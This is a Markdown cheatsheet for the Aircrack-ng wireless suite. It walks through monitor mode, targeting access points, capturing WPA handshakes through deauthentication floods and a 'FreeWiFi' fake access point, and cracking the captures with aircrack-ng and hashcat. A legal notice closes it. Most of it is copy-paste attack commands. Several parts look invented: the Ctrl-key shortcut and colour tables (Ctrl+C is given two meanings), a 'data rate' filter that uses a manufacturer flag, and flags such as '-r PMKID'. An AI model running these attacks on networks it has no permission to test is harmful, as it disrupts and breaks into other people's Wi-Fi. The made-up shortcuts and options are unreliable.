# 🔐 Aircrack-ng Suite Cheatsheet

A comprehensive reference for wireless security testing with the Aircrack-ng suite.

---

## 🚀 Quick Start Process

### 1. **Monitor Mode Setup**
```bash
# Check available interfaces
iwconfig

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig
```

### 2. **AP Discovery**
```bash
# Scan for access points
sudo airodump-ng wlan0mon

# Target specific channel
sudo airodump-ng -c 6 wlan0mon

# Target specific BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

### 3. **Capture Handshake**
```bash
# Capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# In another terminal - deauth attack
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 4. **Crack Handshake**
```bash
# Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Brute force (4-way handshake)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

---

## ⌨️ Airodump-ng Keyboard Shortcuts

### **Main Screen Navigation**
| Key | Action | Description |
|-----|--------|-------------|
| ++ctrl+c++ | **Exit** | Stop scanning and exit |
| ++ctrl+s++ | **Sort** | Cycle through sort options |
| ++ctrl+r++ | **Reset** | Reset statistics |
| ++ctrl+a++ | **AP List** | Toggle AP list view |
| ++ctrl+c++ | **Client List** | Toggle client list view |
| ++ctrl+f++ | **Filter** | Set MAC address filter |
| ++ctrl+m++ | **Mark** | Mark/Unmark AP for targeting |
| ++ctrl+t++ | **Target** | Set target AP |
| ++ctrl+u++ | **Update** | Update display |
| ++ctrl+w++ | **Write** | Write to file |
| ++ctrl+x++ | **Export** | Export data |

### **Color Coding Shortcuts**
| Key | Action | Description |
|-----|--------|-------------|
| ++ctrl+1++ | **Red** | Highlight in red |
| ++ctrl+2++ | **Green** | Highlight in green |
| ++ctrl+3++ | **Yellow** | Highlight in yellow |
| ++ctrl+4++ | **Blue** | Highlight in blue |
| ++ctrl+5++ | **Magenta** | Highlight in magenta |
| ++ctrl+6++ | **Cyan** | Highlight in cyan |
| ++ctrl+7++ | **White** | Highlight in white |
| ++ctrl+0++ | **Clear** | Remove color highlighting |

### **Sorting Options** (++ctrl+s++)
- **PWR** - Signal strength
- **Beacons** - Number of beacons
- **Data** - Data packets
- **CH** - Channel
- **MB** - Speed
- **ENC** - Encryption
- **CIPHER** - Cipher type
- **AUTH** - Authentication
- **ESSID** - Network name

### **Filtering & Targeting**
| Key | Action | Description |
|-----|--------|-------------|
| ++ctrl+f++ | **MAC Filter** | Filter by MAC address |
| ++ctrl+m++ | **Mark AP** | Mark AP for targeting |
| ++ctrl+t++ | **Set Target** | Set as primary target |
| ++ctrl+u++ | **Update** | Refresh display |

### **Color Coding Strategy**
| Color | Use Case | Description |
|-------|----------|-------------|
| **Red** | High Priority | Target APs, WEP networks, weak encryption |
| **Green** | Connected | APs with active clients |
| **Yellow** | WPS Enabled | APs with WPS vulnerability |
| **Blue** | Strong Signal | High-power APs for testing |
| **Magenta** | Hidden SSID | Networks with hidden names |
| **Cyan** | 5GHz Networks | Higher frequency targets |
| **White** | Unknown/New | Recently discovered APs |

!!! tip "Color Coding Best Practices"
    - **Red**: Mark your primary targets
    - **Green**: Highlight APs with active clients
    - **Yellow**: Flag WPS-enabled networks
    - **Blue**: Mark high-signal strength APs
    - Use ++ctrl+0++ to clear colors and start fresh

---

## 🎯 AP Discovery & Targeting

=== "Basic Scanning"

    ### **Basic AP Scan**
    ```bash
    # Scan all channels
    sudo airodump-ng wlan0mon

    # Scan specific channel
    sudo airodump-ng -c 6 wlan0mon

    # Scan multiple channels
    sudo airodump-ng -c 1,6,11 wlan0mon
    ```

    !!! tip "Channel Selection"
        - **2.4GHz**: Channels 1, 6, 11 (non-overlapping)
        - **5GHz**: Channels 36, 40, 44, 48
        - **Scan all**: Use `wlan0mon` without channel specification

=== "Target Specific"

    ### **Target Specific Networks**
    ```bash
    # Target by BSSID
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

    # Target by ESSID (network name)
    sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon

    # Target with file output
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
    ```

    !!! info "Targeting Strategy"
        1. **Broad scan** to identify all APs
        2. **Narrow down** by channel or BSSID
        3. **Capture** specific targets

=== "Advanced Filtering"

    ### **Advanced Filtering**
    ```bash
    # Filter by encryption
    sudo airodump-ng --encrypt WPA wlan0mon

    # Filter by manufacturer
    sudo airodump-ng --manufacturer "Cisco" wlan0mon

    # Filter by data rate
    sudo airodump-ng --manufacturer "Netgear" wlan0mon
    ```

    !!! warning "Filtering Tips"
        - Use **encryption filters** to find WEP/WPA networks
        - **Manufacturer filters** help identify specific router types
        - **Signal strength** filtering finds high-power targets

---

## 🔍 Channel & SSID Targeting

=== "Channel Analysis"

    ### **Channel Analysis**
    ```bash
    # Scan specific channel range
    sudo airodump-ng -c 1-6 wlan0mon

    # Focus on 2.4GHz channels
    sudo airodump-ng -c 1,6,11 wlan0mon

    # Focus on 5GHz channels
    sudo airodump-ng -c 36,40,44,48 wlan0mon
    ```

    !!! info "Channel Selection Guide"
        - **2.4GHz**: 1, 6, 11 (non-overlapping)
        - **5GHz**: 36, 40, 44, 48 (common channels)
        - **Range scanning**: Use `-c 1-6` for multiple channels

=== "SSID Strategy"

    ### **SSID Targeting Strategy**
    ```bash
    # 1. Initial broad scan
    sudo airodump-ng wlan0mon

    # 2. Identify target channel
    sudo airodump-ng -c [TARGET_CHANNEL] wlan0mon

    # 3. Focus on specific BSSID
    sudo airodump-ng -c [CHANNEL] --bssid [BSSID] wlan0mon

    # 4. Capture handshake
    sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
    ```

    !!! tip "Targeting Workflow"
        1. **Broad scan** to see all networks
        2. **Channel focus** to reduce noise
        3. **BSSID targeting** for specific AP
        4. **Handshake capture** for cracking

---

## ⚡ Handshake Capture Process

=== "Passive Capture"

    ### **Method 1: Passive Capture**
    ```bash
    # Start capture
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

    # Wait for client to connect naturally
    # Monitor for WPA handshake in top-right corner
    ```

    !!! info "Passive Method"
        - **Pros**: No interference, stealthy
        - **Cons**: Requires patience, depends on client activity
        - **Best for**: High-traffic networks with regular connections

=== "Active Deauth"

    ### **Method 2: Active Deauth Attack**
    ```bash
    # Terminal 1: Capture handshake
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

    # Terminal 2: Deauth attack
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

    # Terminal 3: Target specific client
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
    ```

    !!! warning "Active Method"
        - **Pros**: Faster results, more reliable
        - **Cons**: More detectable, may cause network disruption
        - **Best for**: Testing environments, authorized assessments

=== "Fake AP Attack"

    ### **Method 3: Fake AP Attack**
    ```bash
    # Create fake AP
    sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon

    # Capture handshakes from connecting clients
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
    ```

    !!! danger "Fake AP Method"
        - **Pros**: Can capture multiple handshakes
        - **Cons**: Highly detectable, requires careful setup
        - **Best for**: Advanced testing, social engineering scenarios

---

## 🔓 Cracking Techniques

### **Dictionary Attacks**
```bash
# Basic dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Custom wordlist
sudo aircrack-ng -w /path/to/custom.txt handshake-01.cap

# Multiple wordlists
sudo aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
```

### **Brute Force Attacks**
```bash
# 4-way handshake brute force
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# PMKID attack (if supported)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -r PMKID handshake-01.cap
```

### **Hashcat Integration**
```bash
# Convert cap to hccapx
cap2hccapx handshake-01.cap handshake.hccapx

# Hashcat attack
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt

# GPU acceleration
hashcat -m 2500 -d 1 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

---



## 📊 Monitoring & Analysis

### **Real-time Monitoring**
```bash
# Monitor specific channel
sudo airodump-ng -c 6 wlan0mon

# Monitor with filters
sudo airodump-ng -c 6 --manufacturer "Cisco" wlan0mon

# Export data
sudo airodump-ng -c 6 -w monitoring wlan0mon
```

### **Traffic Analysis**
```bash
# Capture all traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w traffic wlan0mon

# Analyze with Wireshark
wireshark traffic-01.cap
```

---

## 🔧 Troubleshooting

### **Common Issues**

**Monitor mode not working:**
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Restart network manager
sudo systemctl restart NetworkManager

# Manual monitor mode
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

**No APs detected:**
```bash
# Check interface
iwconfig

# Verify monitor mode
iwconfig wlan0mon

# Check for interference
sudo airmon-ng check
```

**Handshake not captured:**
```bash
# Verify target is active
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Check for clients
# Look for associated clients in airodump output

# Try different deauth methods
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 📋 Quick Reference

### **Essential Commands**
| Task | Command |
|------|---------|
| **Start Monitor** | `sudo airmon-ng start wlan0` |
| **Scan APs** | `sudo airodump-ng wlan0mon` |
| **Target AP** | `sudo airodump-ng -c 6 --bssid BSSID wlan0mon` |
| **Capture** | `sudo airodump-ng -c 6 --bssid BSSID -w capture wlan0mon` |
| **Deauth** | `sudo aireplay-ng -0 5 -a BSSID wlan0mon` |
| **Crack** | `sudo aircrack-ng -w wordlist.txt capture-01.cap` |

### **Key Shortcuts**
- ++ctrl+c++ - Exit
- ++ctrl+s++ - Sort options
- ++ctrl+m++ - Mark AP
- ++ctrl+t++ - Set target
- ++ctrl+f++ - Filter by MAC

---

## ⚠️ Legal Notice

!!! warning "Important Legal Notice"
    **This cheatsheet is for educational and authorized testing purposes only.**
    
    - Only test networks you own or have explicit permission to test
    - Unauthorized access to networks is illegal
    - Use responsibly and ethically
    - Follow local laws and regulations

---

## 🔗 Additional Resources

- [Aircrack-ng Official Documentation](https://www.aircrack-ng.org/)
- [Kali Linux Wireless Testing](https://www.kali.org/tools/aircrack-ng/)
- [Wireless Security Best Practices](https://www.wi-fi.org/security)

---

*This cheatsheet covers the most common Aircrack-ng scenarios. Always ensure you have proper authorization before testing.*
